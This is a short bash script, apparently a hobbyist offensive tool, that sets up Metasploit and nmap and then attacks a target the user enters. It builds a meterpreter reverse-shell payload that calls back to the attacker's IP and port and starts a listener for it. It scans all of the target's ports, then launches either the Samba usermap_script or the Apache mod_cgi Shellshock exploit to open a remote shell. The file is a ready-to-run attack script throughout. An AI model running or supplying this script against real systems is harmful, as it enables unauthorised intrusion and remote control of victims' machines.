#!/bin/bash

## Developer: SirCryptic (B1naryRenagades ~ NullSecurityTeam)
## Info: First Beta Script of mine (sircryptic) to weaponize any debian distro  (BETA v0.1)

# Install necessary packages
sudo apt-get update
sudo apt-get install -y metasploit-framework nmap

# Configure Metasploit database
sudo service postgresql start
sudo msfdb init

# Set up reverse shell
echo "Enter attacker's IP address:"
read attacker_ip
echo "Enter attacker's port number:"
read attacker_port
echo "Enter target's IP address:"
read target_ip
echo "Enter target's username:"
read target_username

# Ask user to choose exploit
echo "Choose an exploit to use:"
echo "1) Samba usermap_script"
echo "2) Apache mod_cgi"

read -p "Enter exploit number: " exploit_num

case $exploit_num in
  1)
    exploit_name="exploit/multi/samba/usermap_script"
    ;;
  2)
    exploit_name="exploit/multi/http/apache_mod_cgi_bash_env_exec"
    ;;
  *)
    echo "Invalid exploit number"
    exit 1
    ;;
esac

# Create reverse shell payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -f elf > /tmp/shell.elf

# Start Metasploit and exploit target
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $attacker_ip; set LPORT $attacker_port; run" &> /dev/null &
sleep 10
nmap -p- -sV $target_ip
msfconsole -q -x "use $exploit_name; set RHOSTS $target_ip; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $attacker_ip; set LPORT $attacker_port; set USERNAME $target_username; set SMBUSER $target_username; set SMBPASS ''; set RPATH /tmp/; set SRVHOST $attacker_ip; set SRVPORT 445; exploit" &> /dev/null &

echo "Exploit complete."